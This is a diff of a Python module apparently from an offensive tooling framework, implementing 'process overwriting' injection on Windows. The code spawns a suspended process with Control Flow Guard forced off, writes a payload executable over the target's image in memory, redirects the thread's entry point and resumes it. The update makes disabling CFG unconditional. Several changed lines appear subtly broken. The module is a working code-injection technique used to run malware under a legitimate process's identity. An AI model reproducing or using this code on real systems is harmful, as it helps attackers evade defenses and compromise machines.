@@ -1,6 +1,6 @@
 ########################################################
 ### PSOverwrite Module
-### Status: cleaned, 083
+### Status: migrated 084
 ###
 ########################################################
 
@@ -13,57 +13,40 @@ from utils.winconst import *
 CATEGORY    = 'inject'
 DESCRIPTION = 'Process_Overwrite Module, depends on https://github.com/hasherezade/process_overwriting'
 
-def register_arguments(parser):
-            parser.add_argument('-p', '--payload', type=str, required=True, help='Payload, which overwrites the target')
-            parser.add_argument('-t', '--target', type=str, required=True, help='Target process, to overwrite')
-            parser.add_argument('-n', '--nocfg', action='store_true', default=False, required=False, help='Create the process with CFGuard disabled')
+arglist = {
+    'target':           { 'value': '', 'desc': 'Target process, to overwrite' },
+    'payload':          { 'value': '', 'desc': 'Payload, which overwrites the target' },
+}
 
-class STARTUPINFOEX(ctypes.Structure):
-    _fields_ = [
-        ("StartupInfo", STARTUPINFO),
-        ("lpAttributeList", LPVOID)
-    ]
+def register_arguments(parser):
+            parser.add_argument('-p', '--payload', type=str, required=True, help=arglist['payload']['desc'])
+            parser.add_argument('-t', '--target', type=str, required=True, help=arglist['target']['desc'])
 
 class module:
         Author = 'psycore8'
-        Version = '0.1.5'
+        Version = '0.2.0'
         DisplayName = 'PROCESS-OVERWRITE'
         pid = 0
         attr_list = any
+        shell_path = '::inject::psoverwrite'
         import pefile
         import os   
 
-        def __init__(self, target, payload, nocfg=bool):
+        def __init__(self, target, payload):
               self.target = target
               self.payload = payload
-              self.nocfg = nocfg
         
         def msg(self, message_type, MsgVar=None, ErrorExit=False):
             messages = {
                     'pre.head'         : f'{nstate.FormatModuleHeader(self.DisplayName, self.Version)}\n',
                     'create.cfg'       : f'{nstate.f_out} CFGuard mitigation will be applied!',
-                    'create.try'       : f'{nstate.s_note} Create suspended Process...',
-                    'create.error'     : f'{nstate.s_fail} CreateProcess failed',
-                    'create.success'   : f'{nstate.s_ok} CreateProcess successful! PID: {MsgVar}',
-                    'size.error'       : f'{nstate.s_fail} The payload is too big to fit in target!',
-                    'arg.error'        : f'{nstate.s_fail} One of the given arguments are not valid!',
-                    'base.success'     : f'{nstate.f_out} Base address found: {MsgVar}',
-                    'base.error'       : f'{nstate.s_fail} Base address NOT found',
-                    'target.try'       : f'{nstate.s_note} Processing target image',
-                    'target.success'   : f'{nstate.s_ok} Target {MsgVar}',
-                    'payload.try'      : f'{nstate.s_note} Processing payload image',
-                    'payload.success'  : f'{nstate.s_ok} Payload {MsgVar}',
-                    'pe.map'           : f'{nstate.s_note} Mapping memory image',
-                    'pe.pad'           : f'{nstate.f_out} Padding image to target size, adding {MsgVar} bytes',
+                    'arg.error'        : f'{nstate.s_fail} Given argument is not valid: {MsgVar}',
                     'prot_img'         : f'{nstate.s_note} Set memory to PAGE_READWRITE',
-                    'write.try'        : f'{nstate.s_note} Writing to process memory',
-                    'write.success'    : f'{nstate.s_ok} {MsgVar} bytes written to target process',
                     'sec.try'          : f'{nstate.s_note} Set section protections',
-                    'ep.success'       : f'{nstate.f_out} Entry point is {MsgVar}',
-                    'tc.try'           : f'{nstate.s_note} Redirecting code flow to new entry point',
-                    'tc.success'       : f'{nstate.f_out} RCX value changed to {MsgVar}',
-                    'thread.success'   : f'{nstate.s_note} ResumeThread PID: {MsgVar}',
                     'error'            : f'{nstate.s_fail} Error: {ctypes.get_last_error()}',
+                    'mok'              : f'{nstate.s_ok} {MsgVar}',
+                    'mnote'            : f'{nstate.s_note} {MsgVar}',
+                    'merror'           : f'{nstate.s_fail} {MsgVar}',
                     'post.done'        : f'{nstate.s_ok} DONE!'
             }
             print(messages.get(message_type, f'{message_type} - this message type is unknown'))
@@ -71,27 +54,7 @@ class module:
              exit()
                 
         def get_remote_base_address(self, hp):
-            class PEB(ctypes.Structure):
-                _fields_ = [
-                    ("Reserved1", BYTE * 2),
-                    ("BeingDebugged", BYTE),
-                    ("Reserved2", BYTE),
-                    ("Reserved3", BYTE * 2),
-                    ("Ldr", BYTE), 
-                    ("ProcessParameters", BYTE),
-                    ("Reserved4", BYTE * 3),
-                    ("AtlThunkSListPtr", BYTE),
-                    ("Reserved5", BYTE),
-                    ("Reserved6", BYTE),
-                    ("Reserved7", BYTE),
-                    ("ImageBaseAddress", LPCVOID) 
-                ]
-            class PROCESS_BASIC_INFORMATION(ctypes.Structure):
-                _fields_ = [
-                    ("Reserved1", LPVOID),
-                    ("PebBaseAddress", LPCVOID),
-                    ("Reserved2", LPVOID * 4)
-                ]
+
             pbi = PROCESS_BASIC_INFORMATION()
             status = ntdll.NtQueryInformationProcess(hp, 0, ctypes.byref(pbi), ctypes.sizeof(pbi), None)
             
@@ -139,7 +102,6 @@ class module:
 
         def create_nocfg_attributes(self, siex):
             ctypes.memset(ctypes.byref(siex), 0, ctypes.sizeof(STARTUPINFOEX))
-            siex.StartupInfo.cb = ctypes.sizeof(STARTUPINFOEX)
             
             cbAttributeListSize = ctypes.c_size_t(0)
             MitgFlags = ctypes.c_ulonglong(PROCESS_CREATION_MITIGATION_POLICY_CONTROL_FLOW_GUARD_ALWAYS_OFF)
@@ -158,10 +120,7 @@ class module:
             if not kernel32.UpdateProcThreadAttribute(buffer, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, ctypes.byref(MitgFlags), ctypes.sizeof(MitgFlags), None, None):
                 print(f"UpdateProcThreadAttribute failed: {kernel32.GetLastError():#x}")
                 return False
-            kernel32.DeleteProcThreadAttributeList(buffer)
-            
-            self.attr_list = buffer
-            return True
+            return True, buffer
         
         def free_nocfg_attributes(siex):
             if siex.lpAttributeList:
@@ -172,85 +131,90 @@ class module:
         def process(self):
             m = self.msg
             m('pre.head')
-            LPPROC_THREAD_ATTRIBUTE_LIST = LPVOID
-            siex = STARTUPINFOEX()
             bytes_written = SIZE_T()
             context = CONTEXT()
             oldprotect = USHORT(0)
-            si = STARTUPINFO()
             pi = PROCESS_INFORMATION()
 
-            if not (self.os.path.exists(self.target) and self.os.path.exists(self.payload)):
-                 m('arg.error', None, True)
+            target_exists = self.os.path.exists(self.target)
+            payload_exists = self.os.path.exists(self.payload)
+            # if not target_exists or payload_exists:
+            #      m('arg.error', None, True)
+            if not target_exists:
+                 m('arg.error', self.target, True)
+            if not payload_exists:
+                 m('arg.error', self.payload, True)
 
-            siex = STARTUPINFOEX()
             process_flags = CREATE_SUSPENDED | CREATE_NEW_CONSOLE
+            m('create.cfg')
+            process_flags = CREATE_SUSPENDED | CREATE_NEW_CONSOLE | EXTENDED_STARTUPINFO_PRESENT
+            size = ctypes.c_size_t()
+            kernel32.InitializeProcThreadAttributeList(None, 1, 0, ctypes.byref(size))
+            attr_list = ctypes.create_string_buffer(size.value)
+            if not kernel32.InitializeProcThreadAttributeList(attr_list, 1, 0, ctypes.byref(size)):
+                raise ctypes.WinError(ctypes.get_last_error())
+            policy = ctypes.c_ulonglong(PROCESS_CREATION_MITIGATION_POLICY_CONTROL_FLOW_GUARD_ALWAYS_OFF)
+            if not kernel32.UpdateProcThreadAttribute(attr_list, 0,  PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, ctypes.byref(policy), ctypes.sizeof(policy), None, None):
+                raise ctypes.WinError(ctypes.get_last_error())
+            siex = STARTUPINFOEX()
+            siex.StartupInfo.cb = ctypes.sizeof(STARTUPINFOEX)
+            siex.lpAttributeList = ctypes.cast(attr_list, ctypes.c_void_p)
 
-            if self.nocfg:
-                m('create.cfg')
-                process_flags = CREATE_SUSPENDED | CREATE_NEW_CONSOLE | EXTENDED_STARTUPINFO_PRESENT
-                if not self.create_nocfg_attributes(siex):
-                    self.free_nocfg_attributes(siex)
-                    m('error')
-                si = siex.StartupInfo
-                si.cb = ctypes.sizeof(siex)
-                siex.lpAttributeList = ctypes.cast(self.attr_list, LPPROC_THREAD_ATTRIBUTE_LIST)
-
-            m('create.try')
-            success = CreateProcess(None, self.target, None, None, False, process_flags, None, None, ctypes.byref(si), ctypes.byref(pi))
+            m('mnote', 'Create suspended Process...')
+            success = CreateProcess(None, ctypes.c_wchar_p(self.target), None, None, False, process_flags, None, None, ctypes.byref(siex), ctypes.byref(pi))
             if not success:
                 m('error')
-                m('create.error', None, True)
+                m('merror', 'CreateProcess failed', True)
 
-            m('create.success', pi.dwProcessId)
+            m(f'CreateProcess successful! PID: {pi.dwProcessId}')
+            kernel32.DeleteProcThreadAttributeList(attr_list)
 
             base_address = self.get_remote_base_address(pi.hProcess)
             if base_address:
-                 m('base.success', hex(base_address))
+                 m('mnote', f'Base address found: {hex(base_address)}')
             else:
-                m('base.error', None, True)
-                exit()
+                m('merror', 'Base address NOT found', True)
 
-            m('target.try')
+            m('mnote', 'Processing target image')
             pe_target = self.pefile.PE(self.target)
             target_image_size = pe_target.OPTIONAL_HEADER.SizeOfImage
             target_img_base = pe_target.OPTIONAL_HEADER.ImageBase
             target_info = f'image base: {hex(target_img_base)} - Size: {target_image_size}'
-            m('target.success', target_info)
+            m('mok', f'Target: {target_info}')
 
-            m('payload.try')
+            m('mnote', 'Processing payload image')
             pe_payl = self.pefile.PE(self.payload)
             payload_img_base = pe_payl.OPTIONAL_HEADER.ImageBase
             payload_image_size = pe_payl.OPTIONAL_HEADER.SizeOfImage
 
             payload_info = f'image base: {hex(payload_img_base)} - Size: {payload_image_size}'
-            m('payload.success', payload_info)
+            m('mok', f'Payload: {payload_info}')
 
             if payload_image_size > target_image_size:
-                 m('size.error', None, True)
+                 m('merror', 'The payload is too big to fit in target!', True)
 
-            m('pe.map')
+            m('mnote', 'Mapping memory image')
             pe_module = pe_payl.get_memory_mapped_image()
 
             ### fill payload PE image with 00
             padding_bytes = target_image_size - len(pe_module)
-            m('pe.pad', padding_bytes)
+            m('mnote', f'Padding image to target size, adding {padding_bytes} bytes')
             padding = (target_image_size - len(pe_module)) * b'\x00'
             padded_payl = pe_module + padding
 
             status = VirtualProtectEx(pi.hProcess, base_address, target_image_size, PAGE_READWRITE, oldprotect)
 
-            m('write.try')
+            m('mnote', 'Writing to process memory')
             if not WriteProcessMemory(pi.hProcess, base_address, padded_payl, target_image_size, ctypes.byref(bytes_written)):
                  raise Exception(f"WriteProcessMemory error: {ctypes.get_last_error()}")
 
-            m('write.success', bytes_written.value)
+            m('mok', f'{bytes_written.value} bytes written to target process')
             self.set_section_access(pi.hProcess, base_address, pe_payl, target_image_size)
             entry_point_rva = pe_payl.OPTIONAL_HEADER.AddressOfEntryPoint
             entry_point = base_address + entry_point_rva
-            m('ep.success', hex(entry_point))
+            m('mnote', f'Entry point is {hex(entry_point)}')
 
-            m('tc.try')
+            m('mnote', 'Redirecting code flow to new entry point')
             context.ContextFlags = 0x10007  # CONTEXT_FULL
             status = GetThreadContext(pi.hThread, ctypes.byref(context))
             if status == 0:
@@ -261,9 +225,9 @@ class module:
             if status == 0:
                  raise Exception(f"SetThreadCntext error: {ctypes.get_last_error()}")
             else:
-                 m('tc.success', hex(entry_point))
+                 m('mok', f'RCX value changed to {hex(entry_point)}')
 
-            m('thread.success', pi.dwProcessId)
+            m('mok', f'ResumeThread PID: {pi.dwProcessId}')
             ResumeThread(pi.hThread)
 
             CloseHandle(pi.hThread)
